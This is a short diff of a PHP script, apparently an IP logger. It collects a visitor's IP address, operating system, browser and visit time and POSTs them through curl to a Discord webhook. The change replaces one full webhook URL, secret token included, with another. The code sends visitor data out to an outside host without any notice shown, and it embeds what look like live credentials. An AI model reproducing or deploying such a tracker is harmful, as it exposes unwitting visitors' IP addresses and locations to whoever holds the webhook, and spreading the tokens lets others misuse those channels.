@@ -78,7 +78,7 @@ else{
 date_default_timezone_set('TIMEZONE');//<------------     Time Zone here      https://www.php.net/manual/en/timezones.php
 $time = date('Y-m-d H:i:s');
 $make_json = json_encode(array ('content'=>"$ip | $user_os | $user_browser | $time\n"));
-$exec = curl_init("https://discordapp.com/api/webhooks/664992122344177700/wiYRWti5F4YqdflnQzRCeaHDR4blRZc8wqmVtsTjQ8mOUw1MQZwS5Ln0QXhsUv3bRoAM"); //<------------     WEBHOOK HERE    
+$exec = curl_init("https://discordapp.com/api/webhooks/665045900585861130/6GF3lWlaJhUF7-iaTdyFQ7cjgEDJNElrEnH3RzQnS4Xr6tgVyOfsJmg0rQZbCrbxT9YU"); //<------------     WEBHOOK HERE    
 curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
 curl_setopt( $exec, CURLOPT_POST, 1);
 curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
